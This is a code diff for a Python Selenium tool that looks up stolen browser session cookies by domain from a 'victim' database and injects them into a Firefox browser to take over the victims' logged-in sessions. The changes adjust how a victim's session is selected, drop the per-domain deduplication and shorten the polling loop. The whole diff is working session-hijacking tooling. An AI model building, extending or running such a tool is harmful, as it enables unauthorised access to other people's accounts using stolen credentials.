@@ -11,17 +11,19 @@ from webdriver_manager.firefox import GeckoDriverManager
 
 def verify_selection(selection, sessions):
     if is_int(selection) and selection != "s":
-        if int(selection) in range(1, sessions+1):
+        if selection in sessions:
             return True
     return False
 
 
-def load_selection_screen(sessions):
+def load_selection_screen(sessions, victim):
     os.system("cls")
+    sessions_available = [number for (number, _) in victim.items()]
     print(f"[i] {sessions} sessions detected.")
-    question = f"Which one to load? (1-{sessions}, s to skip) "
+    print(f"Sessions available: {sessions_available}")
+    question = f"Which one to load? (s to skip): "
     selection = input(question)
-    while not verify_selection(selection, sessions):
+    while not verify_selection(selection, sessions_available):
         print("[-] Couldn't find that, try again")
         selection = input(question)
     return selection
@@ -29,9 +31,9 @@ def load_selection_screen(sessions):
 
 def load_cookies(victim, driver: webdriver.Firefox):
     sessions = len(victim)
-    selection = "0"
+    selection = next(iter(victim.keys()))
     if sessions > 1:
-        selection = str(int(load_selection_screen(sessions))-1)
+        selection = str(int(load_selection_screen(sessions, victim))-1)
     if selection == "s":
         print("[+] Skipping...")
         return False
@@ -145,24 +147,21 @@ def run_browser_interactive(database):
     print(f"[+] Loading Browser...")
     driver.get("https://www.google.com")
     print("[+] Done")
-    added = set()
     while True:
         url = driver.current_url
         domains = []
         subdomain, domain, suffix = tldextract.extract(url)
         full_url = f"{subdomain}.{domain}.{suffix}"
-        if full_url not in added:
-            added.add(full_url)
-            domains.append(full_url)
-            if subdomain:
-                domains.append(f".{domain}.{suffix}")
-            victims = database.from_domains(domains)
+        domains.append(full_url)
+        if subdomain:
+            domains.append(f".{domain}.{suffix}")
+        victims = database.from_domains(domains)
+        victim = selection_screen(victims, url)
+        while victim:
+            load_cookies(victims[victim], driver)
+            driver.get(url)
             victim = selection_screen(victims, url)
-            while victim:
-                load_cookies(victims[victim], driver)
-                driver.get(url)
-                victim = selection_screen(victims, url)
-        time.sleep(3)
+        time.sleep(1)
 
 
 def run_browser_url(database, url):
